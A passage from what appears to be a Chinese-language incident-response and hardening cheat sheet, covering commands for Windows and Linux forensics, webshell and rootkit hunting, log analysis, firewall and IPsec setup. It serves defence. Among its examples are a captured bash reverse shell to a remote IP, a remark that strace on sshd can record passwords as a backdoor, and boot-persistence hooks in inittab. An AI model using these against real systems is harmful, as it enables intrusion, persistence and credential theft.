&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;安装Rootkit Hunter：
tar xvzf rkhunter-xx.tar.gz
cd rkhunter-xx
./install.sh --layout default --install
开始检测：
rkhunter -check
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3、强大的日志分析工具Log Parser
#分析IIS日志&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;有了这些我们就可以对windows日志进行分析了。&lt;/p&gt;

&lt;p&gt;比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,'|') AS USERNAME,EXTRACT\_TOKEN(Strings,2,'|') AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,'|') AS Client_IP FROM 'e:\logparser\xx.evtx' WHERE EventID=675&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;样本分析平台&quot;&gt;样本分析平台&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;VirusTotal（简称VT，https://www.virustotal.com/）&lt;/li&gt;
  &lt;li&gt;国内的微步在线（https://x.threatbook.cn/）&lt;/li&gt;
  &lt;li&gt;腾讯的哈勃系统（https://habo.qq.com/）&lt;/li&gt;
  &lt;li&gt;金山的火眼（https://fireeye.ijinshan.com/）&lt;/li&gt;
  &lt;li&gt;安全易【日志分析】（https://www.anquanyi.com/）&lt;/li&gt;
  &lt;li&gt;http://www.virscan.org 多引擎可疑文件扫描&lt;/li&gt;
  &lt;li&gt;https://ti.360.net/ 360威胁情报中心&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;日志相关&quot;&gt;日志相关&lt;/h4&gt;

&lt;p&gt;日志文件位置：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Apache日志位置配置在httpd.conf中。
IIS日志默认存放在%systemroot%\system32\LogFiles\W3SVC目录，如果没有，可以通过配置文件查找，WEB站点—属性—网站—W3C扩展日志文件格式—属性—日志文件目录
apache日志 /usr/local/apache/logs/access_log
weblogic日志 \your_domain\servers\AdminServer\logs\asscee_log
root命令记录 /root/.bash_history
普通用户命令记录：/home/普通用户/.bash_history
/var/log/messages 包括整体系统信息 系统启动期间的日志
/var/log/boot.log 包含系统启动的日志
/var/log/secure SSHD会将所有信息记录（包括失败记录）
/var/log/btmp 记录所有用户的最近信息
/var/log/*
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;应急命令集&quot;&gt;应急命令集&lt;/h3&gt;

&lt;h4 id=&quot;cmd-for-windows&quot;&gt;cmd for windows&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat -b -n【查看目前的网络连接情况】
netstat -ano
tasklist | findstr xxx
taskkill /T /F /PID PID号

知道是上传目录，在web log中查看指定时间范围包括上传文件夹的访问请求
findstr /s /m /I &quot;UploadFiles&quot; *.log
某次博彩事件中的六合彩信息是six.js
findstr /s /m /I &quot;six.js&quot; *.aspx
根据shell名关键字去搜索D盘spy相关的文件有哪些
for /r d:\ %i in (*spy*.aspx) do @echo %i

来查看创建时间：
dir /tc 1.aspx

查看用户recent相关文件，通过分析最近打开分析可疑文件

a) C:\Documents and Settings\Administrator\Recent
b) C:\Documents and Settings\Default User\Recent
c) 开始,运行 %UserProfile%\Recent
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;cmd-for-linux&quot;&gt;cmd for linux&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat  -antpl
lsof -p PID号
cd /proc/pidnumber
ls -ail
rm –rf /proc/pidnumber/恶意程序

curl ip.cn -H &quot;X-Forwarded-For: x.x.x.x&quot;
ps -ef、lsof -i:8080、netstat -lanp

stat -- 获取比 ls 更多的信息

部分敏感命令：
users:显示当前登陆用户信息。
Who:显示谁正在使用系统本地节点的信息。
Last:显示系统曾经被登陆的用户和TTYS。
w:查看谁登陆到系统中，且在做什么操作。 
netstat -anp:查看端口对应的进程关系。
lsof -p PID:查看进程对应的文件，配合netstat -anp查看端口进程文件之间的关系，可以找到可以端口进程对应的文件。
lsof -i:查看实时的进程、服务与端口信息。
ps -aux:查看进程。
chkconfig -list:查看服务启动信息。
find / -perm -004000 -type f:输出所有设置了SUID的文件。
rpm -Va:列举全部软件包的变化情况。


lsof命令用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。
lsof -i:8080【进程号】

【ls实现列文件按时间排序】
1) ls -lt  时间最近的在前面
2) ls -ltr 时间从前到后
3) 利用sort
ls -l | sort +7 (日期为第8列)  时间从前到后
ls -l | sort -r +7 时间最近的在前面

【Strace动态调试】
strace -p PID

strace -o aa -ff -p ssh进程
grep open aa* | grep -v -e No -e null -e denied| grep WR
grep一下open系统调用，然后过滤掉错误信息和/dev/null信息，以及denied信息，并且找WR的
另外，这玩意儿可以当后门记录密码
---------------

查找shell：
find /var/www/html/ -type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot;
find /site/* -type f -name &quot;*.php&quot; |xargs grep &quot;eval(&quot; 　
find /site/* -type f -name &quot;*.asp&quot; |xargs grep &quot;execute(&quot;
find /site/* -type f -name &quot;*.aspx&quot; |xargs grep &quot;eval(&quot;
如果木马做了免杀处理，可以查看是否使用加密函数
find /site/* -type f -name &quot;*.php&quot; |xargs grep &quot;base64_decode&quot;
find /site/* -type f -name &quot;*.php&quot; |xargs grep &quot;@$&quot;

新增文件分析
例如要查找24小时内被修改的JSP文件： 
find ./ -mtime 0 -name &quot;*.jsp&quot;
（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）

查找72小时内新增的文件find / -ctime -2
PS：-ctime 内容未改变权限改变时候也可以查出
根据确定时间去反推变更的文件
ls -al /tmp | grep &quot;Feb 27&quot;

特殊权限的文件
查找777的权限的文件 find / *.jsp -perm 4777
---------------

查看可疑账号：

查看UID为0的帐号：awk -F: '{if($3==0)print $1}' /etc/passwd
查看能够登录的帐号：cat /etc/passwd | grep -E &quot;/bin/bash$&quot;
PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）

-----------------

查找日志：
1、注入漏洞记录
grep -i select%20 *.log  | grep 500 | grep -i \.php 
查找后缀为&quot;.log&quot;文件，搜索关键字为&quot;select%20&quot;,筛选存在&quot;500&quot;的行
grep -i sqlmap *.log
sqlmap默认User-Agent是sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)，查看存在sqlmap的行，可以发现sqlmap拖库的痕迹。

2、跨站漏洞记录
grep -i &quot;script&quot; *.log 查找存在script的行。

3、扫描器扫描
grep -i acunetix *.log AWVS扫描时，会发送大量含有&quot;acunetix&quot;的数据包

4、搜索特定时间的日志
grep \[07/Jul/2016:24:00:* *.log 可以结合入侵时间搜索，文件修改时间不可作为依据，菜刀上就可以修改文件时间属性。

5、搜索特定IP地址的日志
grep ^192.168.1.* *.log 搜索包含&quot;192.168.1.&quot;字符串开头的行 
grep -v ^192.168.10.* *.log 不搜索包含&quot;192.168.10.&quot;字符串开头的行 
可以结合网站、网络安全策略搜索能访问网站后台、FTP服务等的IP地址。
查看ip访问次数：
cat access.log | awk '{print $1}' | sort | uniq -c
cat /var/log/secure |grep ACCEPTED 查看ssh进入的ip

页面访问排名前十的IP
cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10
页面访问排名前十的URL
cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10
查看最耗时的页面
cat access.log | sort -k 2 -n -r | head 10
---------------

查看所有用户的定时任务：
for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done

netstat –tlp –ano | grep 'ip'



敏感文件：
/var/log/messages:记录整体系统信息，其中也记录某个用户切换到root权限的日志。 
/var/log/secure:记录验证和授权方面信息。例如sshd会将所有信息记录（其中包括失败登录）在这里。
/var/log/lastlog:记录所有用户的最近信息。二进制文件，因此需要用lastlog命令查看内容。
/var/log/btmp:记录所有失败登录信息。使用last命令可查看btmp文件。例如&quot;last -f /var/log/btmp | more&quot;。
/var/log/maillog:记录来着系统运行电子邮件服务器的日志信息。例如sendmail日志信息就送到这个文件中。
/var/log/mail/:记录包含邮件服务器的额外日志。
/var/log/wtmp或/var/log/utmp:记录登录信息。二进制文件，须用last来读取内容;
/etc/passwd:记录用户信息，查看是否存在可疑账号。
/etc/shadow:记录用户密码，查看是否存在可疑账号。
.bash_history:shell日志，查看之前使用过的命令。
/var/log/cron:记录计划任务。


grep evil_ip /var/log/secure*【查看last记录里的可疑ip】
grep &quot;Accept&quot; /var/log/secure* | awk '{print $11}' | sort | uniq【查看所有登录成功的ip】

检查常用命令是否被替换：
[root[@ceshi1](/user/ceshi1) log]# ls -alt /bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/sbin/ | head -n 10

查看.sshd里面的ip：
strings /usr/bin/.sshd | egrep '[1-9]{1,3}\.[1-9]{1,3}\.'

发现可疑进程，查看所在途径【随时准备拷贝自用的bin文件，比如ps】：
netstat -antlp
ps axu | grep xxx| grep -v grep

pstree -p【感觉完全没有win下叼啊】

查看一些临时目录

例如要查找24小时内被修改的JSP文件：
find ./ -mtime 0 -name &quot;*.jsp&quot;

find ./ -mtime 2
搜索是的48~72小时内修改的文件。

find . –mtime +n:
最后一次修改发生在n+1天以前，距离当前时间为(n+1)*24小时或者更早

find . –mtime –n:
最后一次修改发生在n天以内，距离当前时间为n*24小时以内

查找24小时内被修改的JSP文件也可以用：
find ./ -mtime -1 -name &quot;*.jsp&quot;

--------------
echo $PATH 分析有无敏感可疑信息
a) strings命令在对象文件或二进制文件中查找可打印的字符串
b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
PS：此正则不严谨，但匹配IP已够用
c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）
查看ssh相关目录有无可疑的公钥存在。
a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。
b) 目录： /etc/ssh ./.ssh/
--------------------------



查看访问控制文件权限：
setfacl与getfacl

lsattr和chattr
修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录
例子：设置/etc/resolv.conf为不可修改
[root@vincent tmp]# chattr +i /etc/resolv.conf 
[root@vincent tmp]# lsattr /etc/resolv.conf 
----i--------e- /etc/resolv.conf
[root@vincent tmp]# echo &quot;&quot; &amp;gt; /etc/resolv.conf 
-bash: /etc/resolv.conf: 权限不够
lsattr
查看文件权限
[root@vincent tmp]# lsattr 1.txt 
-----a-------e- 1.txt


【获取反弹bash】
netstat -antlp | grep EST | grep bash
【检查在监听的端口】
netstat -antlp | grep LISTEN

【查找敏感目录/tmp, /var/tmp, /dev/shm】
# ls -ald xxx

默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。
之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog.

find ./ -mtime 0 -name &quot;*.jsp&quot; 【找webshell】
diff -r {生产dir} {测试dir}



启动项排查：
【总结一下，针对CentOS5系统，需要排查的点】：
1）/etc/inittab
该文件是可以运行process的，这里我们添加一行
&amp;gt; 0:235:once:/bin/vinc
内容如下
[root@localhost ~]# cat /bin/vinc 
#!/bin/bash
cat /etc/issue &amp;gt; /tmp/version
重启
[root@localhost ~]# cat /tmp/version 
CentOS release 5.5 (Final)
Kernel \r on an \m
2）/etc/rc.d/rc.sysinit
在最后插入一行/bin/vinc
[root@localhost ~]# ll /tmp/version 
-rw-r--r-- 1 root root 47 11-05 10:10 /tmp/version
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local
【总结一下，针对CentOS6系统，需要排查的点】：
1）/etc/init/*.conf
vim tty.conf，添加一行
&amp;gt; exec /bin/vinc
内容如下:
[root@vincenthostname init]# cat /bin/vinc 
#!/bin/bash

touch /tmp/vinc
重启
[root@vincenthostname ~]# ll /tmp/vinc
-rw-r--r-- 1 root root 0 6月  22 15:07 /tmp/vinc
2）/etc/rc.d/rc.sysinit
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local

定时部分：
应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。
其中容易忽视的就是/etc/anacrontab

这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？
anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。

ll /var/spool/cron/*
------------

检查命令替换部分：
1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。
例如我替换一下/bin/ps，然后使用rpm -qaV查看
[root@vincenthostname tmp]# rpm -qa /bin/ps
2）比对命令的大小
例如正常的ps和netstat大小
[root@vincent tmp]# ll /bin/ps
-rwxr-xr-x 1 root root 87112 11月 15 2012 /bin/ps
[root@vincent tmp]# ll /bin/netstat
-rwxr-xr-x 1 root root 128216 5月 10 2012 /bin/netstat
下面是其中有一次应急时的记录
[root@DataNode110 admin]# ls -alt /bin/ | head -n 10
total 10836
-rwxr-xr-x 1 root root 625633 Aug 17 16:26 tawlqkazpu
dr-xr-xr-x. 2 root root 4096 Aug 17 16:26 .
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 ps
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 netstat
可以看到ps和netstat是一样大的。
3）查看命令的修改时间，按修改时间排序
ls -alt /bin/ | head -n 5
4）使用chkrootkit和rkhunter查看
chkrootkit
1、准备gcc编译环境
对于CentOS系统，执行下述三条命令：
&amp;gt; yum -y install gcc gcc-c++ make glibc*
2、下载chkrootkit源码
chkrootkit的官方网站为 http://www.chkrootkit.org ，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：
&amp;gt; [root@www ~]# wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
3、解压下载回来的安装包
&amp;gt; [root@www ~]# tar zxf chkrootkit.tar.gz
4、编译安装（后文命令中出现的&quot;*&quot;无需替换成具体字符，原样复制执行即可）
&amp;gt;[root@www ~]# cd chkrootkit-*
&amp;gt;
&amp;gt;[root@www ~]# make sense
注意，上面的编译命令为make sense。
5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件
&amp;gt;[root@www ~]# cd ..
&amp;gt;[root@www ~]# cp -r chkrootkit- /usr/local/chkrootkit
&amp;gt;[root@www ~]# rm -r chkrootkit-
至此，安装完毕。
使用方法
安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit
直接执行
&amp;gt; root@vm:~# /usr/local/chkrootkit/chkrootkit
rkhunter
在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。
下载地址： http://sourceforge.net/projects/rkhunter/files/
1）安装
tar -xvf rkhunter-1.4.0.tar.gz
cd rkhunter-1.4.0
./installer.sh –install
在安装了kbeast的系统上测试，可以成功检测到。
/usr/local/bin/rkhunter –check -sk
[19:50:27] Rootkit checks…
[19:50:27] Rootkits checked : 389
[19:50:27] Possible rootkits: 1
[19:50:27] Rootkit names : KBeast Rootkit
2）在线升级
rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:
执行命令：
&amp;gt; rkhunter –update
3）检测最新版本
让 rkhunter 保持在最新的版本；
执行命令：
&amp;gt; rkhunter –versioncheck


【创建Audit审计规则】
vim /etc/audit/audit.rules
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell

【编写测试Java命令监控规则，Jboss的启动账户为nobody，添加审计规则】
# grep '\-a' /etc/audit/audit.rules 
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b32 -F uid=99 -S execve -k webshell
【重启服务】
# service auditd restart
Stopping auditd: [ OK ]
Starting auditd: [ OK ]

查看恶意ip试图登录次数：
lastb | awk '{ print $3}'  | sort | uniq -c | sort -n

SSH部分：
【查看登录成功信息】
grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者last命令，它会读取位于/var/log/wtmp的文件

【查看登录失败信息】
grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者lastb命令，会读取位于/var/log/btmp的文件

【查看ssh配置文件和/usr/sbin/sshd的时间】
stat /usr/sbin/sshd

【通过strace监控sshd进程读写（密码）文件的操作】
# ps axu | grep sshd | grep -v grep
root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
# strace -o aa -ff -p 65530
# grep open aa* | grep -v -e No -e null -e denied| grep WR
aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4

进程部分：
【资源占用】
top
【启动时间】
可疑与前面找到的Webshell时间点比对。
【启动权限】
这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：
mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
【父进程】
例如我在菜刀中反弹Bash
[root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c &quot;cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.192.144/2345 0&amp;gt;&amp;amp;1;echo [S];pwd;echo [E]&quot; 2&amp;gt;&amp;amp;1
父进程进程号1014
[root@server120 html]# ps -ef | grep 1014
apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
可以看到父进程为apache，就可以判断攻击者通过Web入侵。
获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。
例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称
udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
使用lsof -p pid可以看到可执行文件
[root@DataNode105 admin]# lsof -p 131683
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
【获取文件类型】
可以文件类型可以使用file获取；


awk '{print $1}' access.log |sort|uniq -c|sort -nr|head -10【获取频率前10的ip】
netstat -nat | grep &quot;192.168.1.15:1234&quot; |awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -20【查看连接某服务端口最多的的IP地址】


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;安全加固&quot;&gt;安全加固&lt;/h4&gt;

&lt;h5 id=&quot;常规应急处理&quot;&gt;常规应急处理&lt;/h5&gt;

&lt;p&gt;杀死进程，kill -9 xxx
删除木马，拷贝正常命令【或者找原来的备份】，删除开机启动项。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
rm: cannot remove `abcfg': Operation not permitted
[root[@ceshi1](/user/ceshi1) tomcat]# lsattr abcfg
----i--------e- abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# chattr -i abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
--------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;屏蔽IP&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A INPUT -i eth0 -s *.*.*.0/24 -j DROP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;windows系统篇&quot;&gt;WINDOWS系统篇&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.1.1 禁用/停止服务
C:&amp;gt; sc query
C:&amp;gt; sc config &quot;服务名&quot; start= disabled
C:&amp;gt; sc stop &quot;服务名&quot;
C:&amp;gt; wmic service where name=&quot;服务名&quot; call ChangeStartmode Disabled
1.1.2 防火墙管理
列出所有规则:
C:&amp;gt; netsh advfirewall firewall show rule name=all
启用或禁用防火墙:
C:&amp;gt; netsh advfirewall set currentprofile state on
C:&amp;gt; netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound
C:&amp;gt; netsh advfirewall set publicprofile state on
C:&amp;gt; netsh advfirewall set privateprofile state on
C:&amp;gt; netsh advfirewall set domainprofile state on
C:&amp;gt; netsh advfirewall set allprofile state on
C:&amp;gt; netsh advfirewall set allprof ile state off
配置举例：
netsh advfirewall firewall add rule name=&quot;开放TCP:80端口&quot; dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name=&quot;开放TCP:443端口&quot; dir=in action=allow protocol=TCP localport=443
netsh advfirewall firewall add rule name=&quot;屏蔽TCP:445端口&quot; dir=in action=block protocol=TCP localport=445
netsh advfirewall firewall add rule name=&quot;允许MyApp&quot; dir=in action=allow program=&quot;C:MyAppMyApp.exe&quot; enable=yes
1.1.3 清除DNS缓存和Netios缓存
C:&amp;gt; ipconfig /flushdns
C:&amp;gt; nbtstat -R
1.1.4 应用控制
AppLocker配置
导入Applocker模块
PS C:&amp;gt; import-module Applocker
查看system32目录下所有exe文件的Applocker信息
PS C:&amp;gt; Get-ApplockerFileinformation -Directory C:WindowsSystem32 -Recurse -FileType Exe
 增加一条针对system32目录下所有的exe文件的允许规则
PS C:&amp;gt; Get-Childitem C:WindowsSystem32*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32
1.1.5 IPSEC
1.）使用预共享密钥的方式新建一条IPSEC本地安全策略，应用到所有连接和协议
C:&amp;gt; netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY
C:&amp;gt; netsh ipsec static add filteraction name=MyIPsecAction action=negotiate 
C:&amp;gt; netsh ipsec static add policy name=MyIPsecPolicy assign=yes
C:&amp;gt; netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all  activate=yes psk=密码
2.）新建一条允许访问外网TCP 80和443端口的IPSEC策略
C:&amp;gt; netsh ipsec static add filteraction name=Allow action=permit
C:&amp;gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80
C:&amp;gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443
C:&amp;gt; netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=密码
3.）查看和禁用某条IPSEC本地安全策略
C:&amp;gt; netsh ipsec static show policy name=MyIPsecPolicy
C:&amp;gt; netsh ipsec static set policy name=MyIPsecPolicy assign=no
新建一条IPSEC对应的防火墙规则，源地址和目的地址为any
C:&amp;gt; netsh advfirewall consec add rule name=&quot;IPSEC&quot; endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default
新建一条IPSEC对应的防火墙规则，所有出站请求必须提供预共享密钥
C:&amp;gt; netsh advfirewall firewall add rule name=&quot;IPSEC_Out&quot; dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any  interfacetype=any security=authenticate
1.1.6 其他安全策略
禁用远程桌面连接
C:&amp;gt; reg add &quot;HKLMSYSTEMCurrentControlSetControlTerminalServer&quot; /f /v fDenyTSConnections /t REG_DWORD /d 1
只发送NTLMv2响应（防止&quot;永恒之蓝&quot;漏洞攻击）
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetControlLsa /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
禁用IPV6
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetservicesTCPIP6Parameters /v DisabledComponents /t REG_DWORD /d 255 /f
禁用sticky键
C:&amp;gt; reg add &quot;HKCUControlPanelAccessibilityStickyKeys&quot; /v Flags /t REG_SZ /d 506 /f
禁用管理共享（Servers/Workstations）
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareServer /t REG_DWORD /d 0
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareWks /t REG_DWORD /d 0
禁用注册表编辑器和CMD命令提示符
C:&amp;gt; reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 1 /f
C:&amp;gt; reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 1 /f
启用UAC
C:&amp;gt; reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem /v EnableLUA /t REG_DWORD /d 1 /f
启用防火墙日志
C:&amp;gt; netsh firewall set logging droppedpackets = enable 
C:&amp;gt; netsh firewall set logging connections = enable
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;linux系统篇&quot;&gt;LINUX系统篇&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.2.1 服务管理
查看服务状态
service --status-all
ps -ef OR ps -aux
initctl list
systemctl list-unit-files
启动，停止和禁用服务
For Upstart services:
/etc/init.d/apache2 start | stop | status
service apache2 start | stop | status
update-rc.d apache2 disable
For Systemd services:
systemctl start | stop | status ntp.service
systemctl disable sshd.service
1.2.2 防火墙管理
iptables 常用操作：
iptables-save &amp;gt; filewall_rules.bak # 导出当前规则
iptables -vnL --line # 列出所有规则
iptables -S # 同上
iptables -P INPUT DROP # 默认策略，禁止所有连接
iptables -A INPUT -s 10.10.10.10 -j DROP # 禁止单个IP
iptables -A INPUT -s 10,10.10.0/24 -j DROP # 禁止一个网段
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP # 禁止某IP访问本机SSH服务
iptables -A INPUT -p tcp --dport ssh -j DROP # 禁止访问本机SSH服务
iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix &quot;
iptables denied: &quot; --log-level 7 # 启用日志
iptables -F # 清除所有已加载的工作
1.2.3 DNS缓存
Unix/Linux系统没有系统级别DNS缓存
1.2.4 配置IPSEC
在两台服务器之间建立IPSEC通道
1.）添加防火墙规则允许IPSEC协议
iptables -A INPUT -p esp -j ACCEPT
iptables -A INPUT -p ah -j ACCEPT
iptables -A INPUT -p udp --dport 500 -j ACCEPT
iptables -A INPUT -p udp --dport 4500 -j ACCEPT
安装Racoon
apt -y install racoon
2.）编辑配置文件：/etc/ipsec-tools.conf
flush;
spdflush;
spdadd 主机A的IP地址 主机B的IP地址 any -P out ipsec
 esp/transport//require;
spdadd 主机B的IP地址 主机A的IP地址 any -P in ipsec
 esp/transport//require;
3.）编辑配置文件：/etc/racoon/racoon.conf
log notify;
path pre_shared_key &quot;/etc/racoon/psk.txt&quot;;
path certificate &quot;/etc/racoon/certs&quot;;
remote anonymous {
 exchange_mode main,aggressive;proposal {    encryption_algorithm aes_256;    hash_algorithm sha256;    authentication_method
pre_shared_key;
     dh_group modp1024;
}
 generate_policy off;
}
sainfo anonymous{
 pfs_group 2;encryption_algorithm aes_256;authentication_algorithm hmac_sha256;compression_algorithm deflate;
}   
4.）添加预共享密钥
主机A：echo 主机B 123 &amp;gt;&amp;gt; /etc/racoon/psk.txt
主机B：echo 主机A 123 &amp;gt;&amp;gt; /etc/racoon/psk.txt
5.）重启服务，检查协商及配置策略
service setkey restart
setkey -D
setkey -DP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;给目录和容器改权限&quot;&gt;给目录和容器改权限&lt;/h4&gt;

